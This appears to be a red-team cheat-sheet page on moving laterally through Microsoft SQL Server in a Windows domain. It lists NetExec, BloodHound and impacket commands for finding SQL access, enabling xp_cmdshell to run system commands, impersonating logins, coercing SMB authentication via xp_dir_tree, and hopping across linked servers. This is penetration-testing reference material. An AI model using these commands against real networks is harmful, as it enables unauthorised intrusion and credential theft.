# MS-SQL Lateral Movement

SQL Server is a lateral-movement medium in its own right. Domain accounts often have more SQL access than intended, `xp_cmdshell` turns that into command execution, and linked servers chain one instance's trust into another's.

## Why It Works

MSSQL integrates with Windows authentication and supports server-to-server links configured with stored credentials. Those links form a trust graph parallel to the domain's, and BloodHound can map the `SQLAdmin` edges that expose it.

## Prerequisites

* A domain account with access to a SQL Server instance
* MSSQL (1433/TCP) reachable, directly or through a pivot

## Execution

**MSSQL**

* find mssql access
  * `nxc mssql <ip> -u <user> -p <password> -d <domain>` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
    * **→ MSSQL**
* Users or Computers with SQL admin
* `MATCH p=(u:Base)-[:SQLAdmin]->(c:Computer) RETURN p` [\[tool\]](https://github.com/SpecterOps/BloodHound)
  * **→ MSSQL**
* `mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)
  * `enum_db`
  * `enable_xp_cmdshell`
    * `xp_cmdshell <cmd>`
      * **→ Low Access**
  * `enum_impersonate`
    * `exec_as_user <user>`
      * **→ MSSQL**
    * `exec_as_login <login>`
      * **→ MSSQL**
  * `xp_dir_tree <ip>`
    * **→ COERCE SMB**
  * `trustlink`
    * `sp_linkedservers`
      * `use_link`
        * **→ MSSQL**
        * **→ Trust**

## Related

* [Pivoting with SOCKS](file:///9685693/lateral-movement/pivoting-with-socks.md) — reaching instances through a tunnel
* [BloodHound & Automated Audit](file:///9685693/enumeration/bloodhound-and-automated-audit.md) — mapping SQLAdmin edges
